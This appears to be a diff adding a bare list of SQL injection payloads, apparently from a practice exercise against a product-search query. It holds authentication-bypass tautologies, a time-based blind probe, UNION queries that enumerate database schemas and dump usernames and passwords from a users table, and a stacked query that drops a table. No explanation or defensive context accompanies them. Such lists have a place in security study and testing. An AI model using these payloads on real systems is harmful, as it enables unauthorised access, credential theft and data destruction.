@@ -1,0 +1,20 @@
+105' or '1'='1
+' or '1'='1
+' or ''='
+' or 1=1;#
+
+
+
+brake%';#
+
+%' AND 1 = SLEEP(2);#
+
+SELECT name, stock, price FROM items WHERE name LIKE '%brake%' UNION (SELECT 1,2,3 from dual);#
+
+SELECT name, stock, price FROM items WHERE name LIKE '%brake%' UNION (SELECT TABLE_NAME,TABLE_SCHEMA,3 from information_schema.tables);#
+
+SELECT name, stock, price FROM items WHERE name LIKE '%brake%' UNION (SELECT COLUMN_NAME,2,3 from information_schema.columns where TABLE_NAME='users');#
+
+SELECT name, stock, price FROM items WHERE name LIKE '%brake%' UNION (SELECT username,password,type from users);#
+
+SELECT name, stock, price FROM items WHERE name LIKE '%brake%'; drop table employee;#
